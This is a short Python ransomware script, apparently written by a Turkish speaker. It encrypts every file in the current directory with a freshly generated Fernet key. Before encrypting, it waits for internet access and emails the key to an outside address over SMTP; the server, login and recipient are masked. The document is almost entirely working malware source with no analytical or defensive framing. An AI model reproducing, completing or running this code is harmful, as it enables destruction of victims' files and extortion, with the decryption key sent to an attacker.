
import os
import fernet
import socket
import smtplib
from email.mime.text import MIMEText
import time


file_list = []

for aktar in os.listdir():
    if aktar == "ransomware,.py" or not os.path.isfile(aktar) or aktar == "generated.key" or aktar == "ransomdecrypter.py":
        continue
    file_list.append(aktar)

key = fernet.Fernet.generate_key()



def is_internet_available() :
    try:
        socket.create_connection(("**********", 80))
        return True
    except OSError:
        return False


def send_key_to_email():
    while True:
        if is_internet_available():
            smtp_server = '********'
            port = 587
            sender_email = '***********'
            password = '*******'

            recipient_email = '*********'
            message = MIMEText(key.decode())
            message['Subject'] = '**************'
            message['From'] = sender_email
            message['To'] = recipient_email

            try:
                with smtplib.SMTP(smtp_server, port) as server:
                    server.starttls()
                    server.login(sender_email, password)
                    server.sendmail(sender_email, recipient_email, message.as_string())
            except smtplib.SMTPAuthenticationError:
                print('Hata: Kimlik doğrulama başarısız oldu.')

            break
        time.sleep(5)


send_key_to_email()



for file in file_list:
    with open(file, "rb") as the_file:
        contents = the_file.read()
    contents_encrypted = fernet.Fernet(key).encrypt(contents)
    with open(file, "wb") as the_file:
        the_file.write(contents_encrypted)
